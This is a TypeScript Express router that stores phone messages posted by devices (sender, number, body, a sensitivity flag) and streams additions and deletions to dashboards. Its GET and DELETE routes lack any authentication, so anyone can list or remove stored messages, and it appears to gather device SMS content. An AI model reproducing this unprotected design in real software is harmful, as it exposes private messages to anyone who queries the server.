import { Router, type IRouter } from "express";
  import { localDb } from "../lib/local-db";
  import { sseEmit } from "../lib/sse";
  import { requireAppSecret } from "../middlewares/appSecret";

  const router: IRouter = Router();

  router.get("/messages", async (req, res) => {
    const { userId, deviceId, appId } = req.query;
    const rows = await localDb.listMessages({
      appId: appId ? String(appId) : undefined,
      userId: !appId && userId ? String(userId) : undefined,
      deviceId: !appId && !userId && deviceId ? String(deviceId) : undefined,
    });
    res.json(rows);
  });

  router.post("/messages", requireAppSecret, async (req, res) => {
    const { appId, deviceId, userId, fromSender, fromNumber, body, isSensitive } = req.body as Record<string, unknown>;
    if (!appId || !deviceId || !fromNumber || !body) {
      res.status(400).json({ error: "appId, deviceId, fromNumber and body are required" });
      return;
    }
    const uid = String(userId ?? `USR-${String(deviceId).slice(-6).toUpperCase()}`);
    const inserted = await localDb.createMessage({
      appId: String(appId),
      deviceId: String(deviceId),
      userId: uid,
      fromSender: String(fromSender ?? "Unknown"),
      fromNumber: String(fromNumber),
      body: String(body),
      isSensitive: Boolean(isSensitive ?? false),
    });
    sseEmit("message_added", { appId: String(appId), message: inserted });
    res.status(201).json({ ok: true, id: inserted.id });
  });

  router.delete("/messages/:id", async (req, res) => {
    const id = Number(req.params.id);
    if (Number.isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
    const row = await localDb.deleteMessage(id);
    if (!row) { res.status(404).json({ error: "Not found" }); return; }
    // Emit SSE so all connected dashboards remove this message instantly
    sseEmit("message_deleted", { appId: row.appId, deviceId: row.deviceId, id });
    res.json({ ok: true });
  });

  export default router;
  